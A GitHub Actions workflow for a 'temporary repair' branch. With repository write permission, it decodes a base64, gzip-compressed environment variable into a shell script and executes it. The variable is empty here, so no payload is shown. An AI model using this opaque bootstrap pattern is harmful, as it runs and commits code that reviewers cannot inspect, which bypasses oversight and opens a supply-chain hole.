name: Temporary SSA execution-contract repair

on:
  push:
    branches:
      - fix/ssa-route-execution-contracts-20260715

permissions:
  contents: write

jobs:
  repair-and-test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repair branch
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up .NET
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.x

      - name: Apply, validate, and commit repair
        shell: bash
        env:
          BOOTSTRAP_GZIP_BASE64: 
        run: |
          set -Eeuo pipefail
          printf '%s' "$BOOTSTRAP_GZIP_BASE64" | base64 --decode | gzip --decompress > /tmp/ssa-bootstrap.sh
          chmod +x /tmp/ssa-bootstrap.sh
          /tmp/ssa-bootstrap.sh
